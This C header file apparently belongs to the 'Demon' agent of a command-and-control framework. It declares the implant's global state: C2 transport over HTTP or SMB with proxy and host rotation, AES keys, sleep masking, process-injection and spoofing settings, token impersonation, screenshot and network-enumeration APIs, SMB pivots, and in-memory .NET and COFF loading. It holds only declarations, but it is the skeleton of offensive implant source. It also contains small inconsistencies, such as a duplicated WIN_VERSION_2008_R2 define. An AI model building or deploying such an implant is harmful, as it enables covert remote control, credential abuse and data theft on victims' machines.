#ifndef DEMON_DEMON_H
#define DEMON_DEMON_H

#include <windows.h>
#include <winsock2.h>
#include <ntstatus.h>
#include <aclapi.h>
#include <windns.h>

#include <Common/Native.h>
#include <Common/Macros.h>
#include <Common/Clr.h>

#include <Core/WinUtils.h>
#include <Core/Token.h>
#include <Core/Pivot.h>
#include <Core/Spoof.h>
#include <Core/Jobs.h>
#include <Core/Package.h>
#include <Core/Download.h>
#include <Core/Transport.h>
#include <Core/Socket.h>

#include <Loader/CoffeeLdr.h>

#define DEMON_MAGIC_VALUE 0xDEADBEEF

#ifdef DEBUG
#include <stdio.h>
#endif

#define WIN_VERSION_UNKNOWN 0
#define WIN_VERSION_XP      1
#define WIN_VERSION_VISTA   2
#define WIN_VERSION_2008    3
#define WIN_VERSION_7       4
#define WIN_VERSION_2008_R2 5
#define WIN_VERSION_2008_R2 6
#define WIN_VERSION_2012    7
#define WIN_VERSION_8       8
#define WIN_VERSION_8_1     8.1
#define WIN_VERSION_2012_R2 9
#define WIN_VERSION_10      10
#define WIN_VERSION_2016_X  11

#define IMAGE_SIZE( IM ) \
    ( ( ( PIMAGE_NT_HEADERS ) ( IM + ( ( PIMAGE_DOS_HEADER ) IM )->e_lfanew ) )->OptionalHeader.SizeOfImage )

// TODO: remove all variables that are not switched/changed after some time
typedef struct
{
    /* MetaData */
    PPACKAGE MetaData;

    struct {
        UINT32  AgentID;
        BOOL    Connected;

        // Module Info
        LPVOID  ModuleBase;

        // Process Info
        DWORD   PID;
        DWORD   PPID;
        WORD    ProcessArch;

        // Computer Info
        WORD    OS_Arch;

        // Token Information
        DWORD   Integrity; // TODO: get this info and send it back
        DWORD   OSVersion;
    } Session;

    struct {
        /* Sleep delay */
        DWORD Sleeping;

        /* Kill Date
         * TODO: add this */
        DWORD KillDate;

        struct {
#ifdef TRANSPORT_HTTP
            PHOST_DATA Host;  /* current using host */
            PHOST_DATA Hosts; /* host linked list */
            LPWSTR     Method; /* TODO: use WCHAR[4] instead of LPWSTR. */
            SHORT      HostRotation;
            DWORD      HostIndex;
            DWORD      HostMaxRetries;
            DWORD      Secure;
            LPWSTR     UserAgent;
            LPWSTR*    Uris;
            LPWSTR*    Headers;

            struct {
                BOOL   Enabled;
                LPWSTR Url;      /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
                LPWSTR Username; /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
                LPWSTR Password; /* TODO: Instead of using LPWSTR use BUFFER (to have the size of the string too) */
            } Proxy;
#endif

#ifdef TRANSPORT_SMB
            LPSTR   Name;
            HANDLE  Handle;
#endif

        } Transport;

        struct
        {
            DWORD   SleepMaskTechnique;
            BOOL    Verbose;
            PVOID   ThreadStartAddr;
            BOOL    CoffeeThreaded;
            BOOL    CoffeeVeh;
            DWORD   DownloadChunkSize;
        } Implant;

        struct
        {
            UINT32  Alloc;
            UINT32  Execute;
        } Memory;

        // Process Config
        struct
        {
            PCHAR   Spawn64;
            PCHAR   Spawn86;
        } Process;

        struct
        {
            DWORD   Technique;
            PVOID   SpoofAddr;
        } Inject;

        // Encryption / Decryption
        struct
        {
            PBYTE   Key;
            PBYTE   IV;
        } AES;

        PVOID PowershellImport;

    } Config ;

    // TODO: format everything by library. inlcude syscalls too
    struct
    {
        // Kernel32
        WIN_FUNC( CreateRemoteThread )
        WIN_FUNC( CreateToolhelp32Snapshot )
        WIN_FUNC( VirtualProtect )
        WIN_FUNC( VirtualAllocEx )
        WIN_FUNC( CreateFileW )
        WIN_FUNC( GetFullPathNameW )
        WIN_FUNC( GetFileSize )
        WIN_FUNC( CreateNamedPipeW )
        WIN_FUNC( WaitNamedPipeW )
        WIN_FUNC( PeekNamedPipe )
        WIN_FUNC( DisconnectNamedPipe )
        WIN_FUNC( WriteFile )
        WIN_FUNC( ConnectNamedPipe )
        WIN_FUNC( FreeLibrary )
        WIN_FUNC( GetProcAddress )
        WIN_FUNC( CreatePipe )
        WIN_FUNC( ReadFile )
        WIN_FUNC( GetComputerNameExA )
        WIN_FUNC( LocalAlloc )
        WIN_FUNC( LocalFree )
        WIN_FUNC( LocalReAlloc )
        WIN_FUNC( CreateProcessA )
        WIN_FUNC( ExitProcess )
        WIN_FUNC( GetExitCodeProcess )
        WIN_FUNC( GetExitCodeThread )
        WIN_FUNC( TerminateProcess )
        WIN_FUNC( InitializeProcThreadAttributeList )
        WIN_FUNC( UpdateProcThreadAttribute )
        WIN_FUNC( VirtualProtectEx )
        WIN_FUNC( ReadProcessMemory )
        WIN_FUNC( GetCurrentDirectoryW )
        WIN_FUNC( FindFirstFileW )
        WIN_FUNC( FindNextFileW )
        WIN_FUNC( DeleteFileW )
        WIN_FUNC( RemoveDirectoryW )
        WIN_FUNC( CreateDirectoryW )
        WIN_FUNC( MoveFileW )
        WIN_FUNC( GetFileTime )
        WIN_FUNC( GetFileAttributesW )
        WIN_FUNC( FindClose )
        WIN_FUNC( FileTimeToSystemTime )
        WIN_FUNC( SystemTimeToTzSpecificLocalTime )
        WIN_FUNC( SetCurrentDirectoryW )
        WIN_FUNC( Wow64DisableWow64FsRedirection )
        WIN_FUNC( Wow64RevertWow64FsRedirection )
        WIN_FUNC( CopyFileW )
        WIN_FUNC( GetModuleHandleA )
        WIN_FUNC( SetProcessValidCallTargets )

        /* Ntdll.dll */
        WIN_FUNC( LdrLoadDll )
        WIN_FUNC( LdrGetProcedureAddress )
        WIN_FUNC( RtlAllocateHeap )
        WIN_FUNC( RtlReAllocateHeap )
        WIN_FUNC( RtlFreeHeap )
        WIN_FUNC( RtlRandomEx )
        WIN_FUNC( RtlNtStatusToDosError )
        WIN_FUNC( RtlGetVersion )
        WIN_FUNC( RtlExitUserThread )
        WIN_FUNC( RtlExitUserProcess )
        WIN_FUNC( RtlCreateTimer )
        NTSTATUS ( NTAPI* RtlCreateTimerQueue ) ( PHANDLE TimerQueueHandle );
        WIN_FUNC( RtlDeleteTimerQueue )
        WIN_FUNC( RtlCaptureContext );
        WIN_FUNC( RtlAddVectoredExceptionHandler );
        WIN_FUNC( RtlRemoveVectoredExceptionHandler );
        WIN_FUNC( NtClose );
        WIN_FUNC( NtSetEvent );
        WIN_FUNC( NtCreateEvent );

        // WinHTTP
        // NOTE: maybe change to WinInet
        WIN_FUNC( WinHttpOpen )
        WIN_FUNC( WinHttpConnect )
        WIN_FUNC( WinHttpOpenRequest )
        WIN_FUNC( WinHttpSetOption )
        WIN_FUNC( WinHttpCloseHandle )
        WIN_FUNC( WinHttpSendRequest )
        WIN_FUNC( WinHttpAddRequestHeaders )
        WIN_FUNC( WinHttpReceiveResponse )
        WIN_FUNC( WinHttpWebSocketCompleteUpgrade )
        WIN_FUNC( WinHttpQueryDataAvailable )
        WIN_FUNC( WinHttpReadData )
        WIN_FUNC( WinHttpQueryHeaders )

        // Mscoree
        HRESULT ( WINAPI *CLRCreateInstance ) ( REFCLSID clsid, REFIID riid, LPVOID* ppInterface );

        // Oleaut32
        WIN_FUNC( SafeArrayAccessData )
        WIN_FUNC( SafeArrayUnaccessData )
        WIN_FUNC( SafeArrayCreate )
        WIN_FUNC( SafeArrayCreateVector )
        WIN_FUNC( SafeArrayPutElement )
        WIN_FUNC( SafeArrayDestroy )
        WIN_FUNC( SysAllocString )

        // Advapi32
        WIN_FUNC( GetTokenInformation )
        WIN_FUNC( GetUserNameA )
        WIN_FUNC( CreateProcessWithTokenW )
        WIN_FUNC( CreateProcessWithLogonW )
        NTSTATUS ( WINAPI* SystemFunction032 ) ( struct ustring* data, struct ustring* key );
        WIN_FUNC( FreeSid )
        WIN_FUNC( SetSecurityDescriptorSacl )
        WIN_FUNC( SetSecurityDescriptorDacl )
        WIN_FUNC( InitializeSecurityDescriptor )
        WIN_FUNC( AddMandatoryAce )
        WIN_FUNC( InitializeAcl )
        WIN_FUNC( AllocateAndInitializeSid )
        WIN_FUNC( SetEntriesInAclW )

        // Thread Management
        WIN_FUNC( OpenThread )
        WIN_FUNC( Thread32First )
        WIN_FUNC( Thread32Next )
        WIN_FUNC( ResumeThread )

        WIN_FUNC( GetThreadContext )
        WIN_FUNC( SetThreadContext )

        WIN_FUNC( ConvertThreadToFiberEx );
        WIN_FUNC( ConvertFiberToThread );
        WIN_FUNC( SwitchToFiber );
        WIN_FUNC( CreateFiberEx );
        WIN_FUNC( DeleteFiber );

        // Token Management
        WIN_FUNC( RevertToSelf )
        WIN_FUNC( LookupAccountSidA )
        WIN_FUNC( LookupPrivilegeNameA )
        WIN_FUNC( ImpersonateLoggedOnUser )
        WIN_FUNC( LogonUserA )
        WIN_FUNC( AdjustTokenPrivileges )
        WIN_FUNC( OpenProcessToken )
        WIN_FUNC( OpenThreadToken )
        WIN_FUNC( LookupPrivilegeValueA )

        // String Formatting
        INT ( *vsnprintf ) ( PCHAR, SIZE_T, CONST PCHAR, va_list );

        // * MISC *
        WIN_FUNC( CommandLineToArgvW )

        WIN_FUNC( AllocConsole )
        WIN_FUNC( FreeConsole )
        WIN_FUNC( GetConsoleWindow )
        WIN_FUNC( ShowWindow )
        WIN_FUNC( GetStdHandle )
        WIN_FUNC( SetStdHandle )
        WIN_FUNC( GetTickCount )

        WIN_FUNC( GetAdaptersInfo )

        WIN_FUNC( WaitForSingleObjectEx )


        // Screenshot
        WIN_FUNC( GetSystemMetrics )
        WIN_FUNC( GetDC )
        WIN_FUNC( GetCurrentObject )
        WIN_FUNC( GetObjectW )
        WIN_FUNC( CreateCompatibleDC )
        WIN_FUNC( CreateDIBSection )
        WIN_FUNC( SelectObject )
        WIN_FUNC( BitBlt )
        WIN_FUNC( DeleteObject )
        WIN_FUNC( DeleteDC )
        WIN_FUNC( ReleaseDC )

        // Netapi
        WIN_FUNC( NetWkstaUserEnum )
        WIN_FUNC( NetSessionEnum )
        WIN_FUNC( NetLocalGroupEnum )
        WIN_FUNC( NetGroupEnum )
        WIN_FUNC( NetUserEnum )
        WIN_FUNC( NetShareEnum )
        WIN_FUNC( NetApiBufferFree )

        /* Ws2_32.dll */
        WIN_FUNC( WSAStartup )
        WIN_FUNC( WSACleanup )
        WIN_FUNC( WSASocketA )
        WIN_FUNC( ioctlsocket )
        WIN_FUNC( bind )
        WIN_FUNC( listen )
        WIN_FUNC( accept )
        WIN_FUNC( closesocket )
        WIN_FUNC( recv )
        WIN_FUNC( send )
        WIN_FUNC( connect )

        /* dnsapi.dll */
        WIN_FUNC( DnsQuery_A )
    } Win32;

    struct
    {
        WIN_FUNC( NtOpenFile )
        WIN_FUNC( NtOpenThread )
        WIN_FUNC( NtOpenProcess )
        WIN_FUNC( NtOpenProcessToken )
        WIN_FUNC( NtCreateSection )
        WIN_FUNC( NtMapViewOfSection )
        WIN_FUNC( NtDuplicateToken )
        WIN_FUNC( NtQueueApcThread )
        WIN_FUNC( NtSuspendThread )
        WIN_FUNC( NtResumeThread )
        WIN_FUNC( NtCreateEvent )
        WIN_FUNC( NtCreateThreadEx )
        WIN_FUNC( NtDuplicateObject )
        WIN_FUNC( NtGetContextThread )
        WIN_FUNC( NtSetContextThread )
        WIN_FUNC( NtQueryInformationProcess )
        WIN_FUNC( NtQuerySystemInformation )
        WIN_FUNC( NtWaitForSingleObject )
        WIN_FUNC( NtTestAlert )
        WIN_FUNC( NtAllocateVirtualMemory )
        WIN_FUNC( NtWriteVirtualMemory )
        WIN_FUNC( NtReadVirtualMemory )
        WIN_FUNC( NtFreeVirtualMemory )
        WIN_FUNC( NtProtectVirtualMemory )
        WIN_FUNC( NtFlushInstructionCache )
        WIN_FUNC( NtTerminateThread )
        WIN_FUNC( NtContinue )
        WIN_FUNC( NtAlertResumeThread )
        WIN_FUNC( NtSignalAndWaitForSingleObject )
        WIN_FUNC( NtQueryVirtualMemory )
        WIN_FUNC( NtQueryInformationToken )
        WIN_FUNC( NtQueryInformationThread )
    } Syscall ;

    struct
    {
        PVOID Kernel32;
        PVOID Advapi32;
        PVOID Crypt32;
        PVOID CryptSp;
        PVOID Mscoree;
        PVOID Oleaut32;
        PVOID Ntdll;
        PVOID User32;
        PVOID Shell32;
        PVOID Msvcrt;
        PVOID KernelBase;
        PVOID Iphlpapi;
        PVOID Gdi32;
        PVOID Wkscli;
        PVOID NetApi32;
        PVOID Ws2_32;
        PVOID Dnsapi;

#ifdef TRANSPORT_HTTP
        PVOID WinHttp;
#endif
    } Modules;

    /* The main thread environment block */
    PTEB  Teb;

    /* Thread counter. how many threads that are using our code are running ? */
    DWORD  Threads;

    /* Buffer to use for allocating download chunks. */
    BUFFER DownloadChunk;

    /* This is a global variable for dotnet inline-execute
     * holds our CLR instance, assembly and where to output. */
    PDOTNET_ARGS Dotnet;

    /* Linked lists */
    struct {
        PTOKEN_LIST_DATA Vault;

        /* Impersonate token. */
        PTOKEN_LIST_DATA Token;
        BOOL             Impersonate;
    } Tokens;
    PPIVOT_DATA          SmbPivots;
    PJOB_DATA            Jobs;
    PDOWNLOAD_DATA       Downloads;
    PSOCKET_DATA         Sockets;

} INSTANCE;

extern INSTANCE Instance;

VOID DemonMain( PVOID ModuleInst );
VOID DemonRoutine( );
VOID DemonInit( VOID );
VOID DemonMetaData( PPACKAGE* Package, BOOL Header );
VOID DemonConfig();

#endif
